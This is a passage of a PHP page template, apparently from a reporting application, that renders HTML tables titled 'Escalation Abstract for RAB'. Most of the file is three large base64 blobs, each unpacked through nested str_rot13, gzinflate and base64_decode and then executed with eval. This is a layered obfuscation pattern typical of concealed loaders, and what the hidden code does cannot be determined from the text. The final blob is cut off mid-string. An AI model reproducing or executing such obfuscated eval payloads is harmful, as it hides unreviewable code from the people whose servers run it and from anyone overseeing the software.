	eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

	?>
	<?php echo $table; ?>
	<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor="#FFFFFF" id="table1">
	<?php echo $tablehead; ?>
	<?php 
	echo "<tr style='background-color:#EEEEEE;' class='labelprint'><td colspan='12' align='center' class='labelbold'>Escalation Abstract for RAB - ".$Crbn."</td></tr>";
	eval(str_rot13(gzinflate(str_rot13(base64_decode('LUrHEuvIDfwa165izKF8b8458+Jvjm/OX2Jln0gSJXcwA2PQ6MYszWP/vf2Ocb2Hd/l7HMoFUP47L0Y6L38XUFsX9/9i/kW0CSxYUmpRXkTxRTzCeDK1f06GVyth8FVCTsJ4zvMLvq5a/KxOuMPkg1YID2yvSBh07zUi3qsDzgCOMiY61st7977n9yMzb/FRujj0tyvwdR7MqgJO01CXqeQowCgtNLGWaTKXGEZFoCoPfWMKl4cGrb0ctMS6S3sMKnCrrx9USgPRAREndJxssashU5jDTma8NS6TJ1AjFebFpz0NgAIjx/eIaoyElNsg27N8C1HY5fZS7Q/EKw+49aBLt9ESwTivbSNdKdzF/ezBEdlwVpEY6SulRbccSTukIecHpRyK8kT8morMroGkPS5mjsx1zD15dbg9jp+Oo9xohStvysV9ip5BZaZFXFRlG/WnZ/7edMiKwiyoFi9gq9FvUgoxHQOXXgO+Wj9GD6lxRIkt7phDHxVaExNcjFSlcBR7erMm8lYIvGVuDbBf+9tEaeXwwW6GvQAaDoxM3I6BLCrGuCI2w0RuoAWL3DAWVLH1WAc/faAYK2uEg9+vciF7UZUCKC2t8ncNKJrEvxLhn5xNbRT59PvDM6xF4eBXW+3NUsWsDRx/HGZ8Tdd9ShFYpGtP4AjuBQ4u7ePso5I0LI0Bc6i3gosRo9L6yA/nykVx9RNB4iGUGDkBHYmE3vUeHimY3CH8ujoCSuhJLSOjfeFP/+a8siMGsKlTKXKyKgrBhmfJBRUDGMatxdf8c2BpT5QX4gTSmvQJ0Yb1L/iJ7+o7Fsnl5wK3ngYR4RqY+4705AdZ3BK0NbUFjgl6wmqfDTXsctxgh5KHhqHJG3tahWQjST3x4jCKDw9fh2qm2QESy5b5j0jPA2uNAIvRCDdMQf0IXfweRYThUc/cCcCzolNxX5OrUQhLsjf+KR3g4pTYp9dme97Vott/x8fYhGaneExs5Vk8UJh3AA4MrEPRrxTxNbOXCWktu0YYNLcnA0qWB/clkrIe2ysTg5khjz3CY8syMGAIpuzwYwk6sJD5kHChUgmWD7TEXvzKCJj0Oyg34bQfVdA0oamzXYSAzR8igRi5YZSpiMfSPHKXHG6l1ucqCtondh0B+Db0GIaAfpkUZ8Z9X0FvuZDTYE59sG1up2TlkSGhZ9QIStU3nQ8WXFsEuRnw3A50q8gLILmwgksxmGBbgyfIiEwI42teJdoSLGRPlJ4trYbt5Or7yrMUnvyhkohGPMcLLpNIorqBxl6Ch2zYWIO1W6UTJ5me++bjo55kkTjzBUFQuuqQofh9yiOOaz8YKh0yKp68H6hCTronkJ9L0OMTjO88g9ebHfV7y8Py85Do6MEcfAht5B2Ttt3Fhv15UJKySlk9o5lYShAZQeJcrQBdDDWfpuAi+Z9YxDW297MeF1/QJka+pUQFaO4TR+jjvrbrQIpyJqC5CbUP9xRs6iDjLdWEKu4vNXWKMo/pyQsbh62XaCD4EoypMAtJ2cxJyYAi4hG5iePVKGICqKodHVrfGLdEr9czD4u5PVvUvNztBacjfVwltxgJHZihoyx+fbD23l3zlZrBdm64eUn7Md0pSfRzvdZCfpuqs6UkHutYRjkmQWwbmTwXmtE6FQxyszhJgrzgNU2D+T2+TcgEVPEbHFFSOB6+5FcqeNA9QLTFZUvjmUwp+/KeZuovd57euo2VcfXf7DP+W5SSQKsQpEckNBIbxJ1U4ZSwzUxE6fVynibXa3n4MSbH0QEVSKUZNITAeZQFmjPFUC340zmTHUw/MHQ/qKiIbxBiY/WbC97vuxeLUOnh78hFk88xtPYbWqkuykiRvMH5ET7U/HkX22MVjPDUVf8x3njeSllq/IoOUci6FSWimN6BcuvDaB1iEIXl1waiylEkzdevgRe/5Lp6K5qsJ9HbCmKXFl8OVpxgJgWAxj943T+7hkpW1BXiAe0l+09WkdrV0ON8etY/Tfp8a2Q9SBKEEPGtNizHwJcOYX2z4JA+Q7rFN5f6C5FedKA1RZdZ0DysNynrIhzDYZ3b5gu1FnKYa9dl4qusutSKZbVSxHMWpnjmU/2ujOlEJzTtXoaqShBNNOblNoPL7bV9dA0JeDYye66bWw3KJ7uK9WSqcFKdixQHrwjNOkrABlm/6AZi2Mt+1fyFHgQBy/m/DAGsCZJnDSKjaV9FfK0KrPr1vgQeirYCRTj6+4RTJnT93ld8JqQiYQxIZgHOArFko7zvaseknvrblUpQ5WwQCKF7GR4s07udO87UevP1iNxRYHA0FJ1z0mgUzixW4u6zm1Za4oZpUSIH0RqlxzhBIUciqWbVSk2Qsi0GZvmxXTfCh5ZIuRCou3lQV4CFQzww2C85bBhtVg6rOw3N8UbhyrmAoJxDBjh0UGP6xl8QGBgb6W2LkskZurkdNIQisvjPvYK0UYCOI2W4g0Yp/He0iw56faQfDKuYUNx0NWgpjruedgVZVDGz3Xu3961MVh6l/UPBzFc7kPHLAZzr0D9Ixn9I05/2UuWNVbfcvNQRgBIqMIKcqu4m85rEN9f4Pz9YLY5C5K96uoVCEz2uoS1XeT+hrY+tafGfJ4+0IR02rmdmoxxkuVqDhOSx1dtDuv4aelQOfmh7hFoykXqM6HwebyOhPKtm5LlS6QN5gWWY9tWeZuI22FzF1xdlwLwh1zhj+JYxCbjWWA6JQGVzxGwWRsqgVQMs5XhVXqVYJhY5GFrClz8/ZLnl55PCIJiMaRBGN24ZU4r2gJfFGBZk4norevSdsTKWWnGucGcsZaL+Kht29m/PpJLb5G9ZayXPmNufZkkLtfzGlTPOGkwRcSOKmibS+g3YNX08unEfCfZbqa38neGvhOEH+zilum6YDYMtk76yIqmJW9S0xvAzy5MKrUhWaChhdlDzPdwToIjimLH82VAeVRfykbd9zyGYjoYxtIFOpYy44/vJXYyEdOHgTiPajAK1A+pYgEWQoGXGdeWgB/KTqoI0ZoqubfIRU8b5iRN90UJkFDLevVijFWH6544YWoXMQDwtcwrnPQwWm7TAjoUIruFOql/BntInHVlwPA0clJdcPKlnFd+IDtlxAiL5orXjJTXC4DnSeehROX0Mmt3npTwnqfgWvsNaiEdS0kp2wpBYH7rUiZcrP+jtxp25L9O1yPns0GIf+VfwvjaptG+Yk9oMoazyh0zZrkaouTY05T+qXOAuOGaembLrI9pNmWh5G1/SaaaOgkujyjCkbIUjf0BAECXsSMzvHIF97ddCVdemH3NujNu32bm/b86V/Eg97QZJD2n8oB7TnF7m0OR7UR1iGZmWoVbjni2Cpb95y0pqf0XKsXoTEoyFs4e6a29B0HNIEb30sQ/gC027Xh07fGPVxKh4N1SP+1UvTJ/ZliYR8yLfhu5IRNHdm0jJHnWTf3fB3EU2IqXQojOm3Jzj+PLpW1I+4g7gxgg0dX5UC6Lvxkz2V2fJe/kUewA7xGgN9HCyfuXgBrnUaiiwydv93jNs6qCGvxTuw8hjP0f7NSKPeG47FA4Q7EaXuz+Zq2gnWRGVzXif7Hjz2w70zRzJsf5Deg4AIlrRLb3YbJKfFUu+pOBrptnuWteqYmkdPRCBl4NuWLAX2ptF9BcWOL4+EKJkwtKOAtyDcAvM9Zx/OSPiQXMCneKpBhMMmT/3Avz8IiFuFKI0rmOPhN2HIO3Tk/WEOGfTc2ITPBSNQyklPyqzlbcIjeD32fkfEoJpfFjyUZQZKx04MT5a2Sgs23nsd4iVFVfE0aI92k43IbTszsiAX7wSzzPSGgOkzAtXtlq8hirtn6aIi1jOT0yfC3DPn5MdcdSECdXHtnE6hYi9BL4AGhGW8s//9lulxGCPX4QsII7NKP8nB+eCqKtjY0lQVeXOx/7hMiRBn3LXzbPHJ6U4whBmoxsn+pwLYQcTsk0NrL744uNBPS0XPaKa5LPAUTQ7RQs8pO1rzMTBbfeTn30hBam0Q340v3CQs75Vht7/039tjKFjMH4kB2FueR+UJxiF8u9cFm+UrWzwOnPde7rqSUZhHHUxuQbjv+bkSH2dBY7IAIkMd1CtsGFkOxHhalRNo8MtouIzNsJThH50FP6dZHzFulCiz2MG5kD8ewL7lfBL1U4Qm0bPJnagCtl1FiiMF4DMCxVpXB61rFxBYlxwlKRC/unWNfDPajf9C7b++vf7+s//AA==')))));

	
	for($i=0;$i<count($subdivisionlist);$i++)
	{
		eval(str_rot13(gzinflate(str_rot13(base64_decode('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